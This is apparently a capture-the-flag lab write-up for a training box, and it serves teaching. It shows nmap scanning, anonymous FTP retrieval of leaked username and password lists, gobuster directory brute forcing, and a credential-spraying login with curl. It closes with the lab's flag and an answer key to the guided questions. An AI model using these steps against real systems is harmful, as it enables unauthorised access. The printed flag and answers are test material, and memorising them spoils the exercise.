# Crocodile

|            |                                                                      |
|------------|----------------------------------------------------------------------|
| Track      | Starting Point - Tier 1                                              |
| Difficulty | Very Easy                                                            |
| OS         | Linux                                                                |
| Tags       | FTP, Web, Apache, Reconnaissance, Anonymous Access, Credential Reuse |
| Tools      | `nmap`, `ftp` (or `curl`), `gobuster`, browser                       |

## Summary

Anonymous FTP gives up two files: a usernames list and a passwords list, in
parallel order. The web server has a `login.php` that accepts one of the
combinations. The trick is the *credential reuse* angle: the box trains you
to spray creds you find on one service against another service entirely.
Loot from FTP doesn't have to stay on FTP.

## Recon

```bash
nmap -sC -sV 10.129.109.27
# 21/tcp  open  ftp     vsftpd 3.0.3   (anonymous login allowed)
# 80/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))
```

## FTP loot

```bash
ftp 10.129.109.27
ftp> ls
# allowed.userlist
# allowed.userlist.passwd
ftp> get allowed.userlist
ftp> get allowed.userlist.passwd
```

```
$ cat allowed.userlist
aron / pwnmeow / egotisticalsw / admin

$ cat allowed.userlist.passwd
root / Supersecretpassword1 / @BaASD&9032123sADS / rKXM59ESxesUFHAd
```

## Web

```bash
gobuster dir -u http://10.129.109.27/ -w /usr/share/dirb/wordlists/common.txt -x php
# /login.php   (Status: 200)
# /dashboard   (Status: 301)
```

`login.php` posts `Username` and `Password` to itself. Spray the four users
across the four passwords, watch for the first response that *isn't* the
"invalid login" page. `admin:rKXM59ESxesUFHAd` 302s to
`/dashboard/index.php`.

```bash
curl -i -c jar -d 'Username=admin&Password=rKXM59ESxesUFHAd&Submit=Login' \
  http://10.129.109.27/login.php
# HTTP/1.1 302 Found
# Location: /dashboard/index.php
```

## Flag

The dashboard prints it in the page header:

```
c7110277ac44d78b6a9fff2232434d16
```

## Guided Tasks

| # | Question | Answer |
|---|----------|--------|
| 1 | What Nmap scanning switch employs the use of default scripts during a scan? | -sC |
| 2 | What service version is found to be running on port 21? | vsftpd 3.0.3 |
| 3 | What FTP code is returned to us for the "Anonymous FTP login allowed" message? | 230 |
| 4 | After connecting to the FTP server using the ftp client, what username do we provide when prompted to log in anonymously? | anonymous |
| 5 | After connecting to the FTP server anonymously, what command can we use to download the files we find on the FTP server? | get |
| 6 | What is one of the higher-privilege sounding usernames in 'allowed.userlist' that we download from the FTP server? | admin |
| 7 | What version of Apache HTTP Server is running on the target host? | Apache httpd 2.4.41 |
| 8 | What switch can we use with Gobuster to specify we are looking for specific filetypes? | -x |
| 9 | Which PHP file can we identify with directory brute force that will provide the opportunity to authenticate to the web service? | login.php |
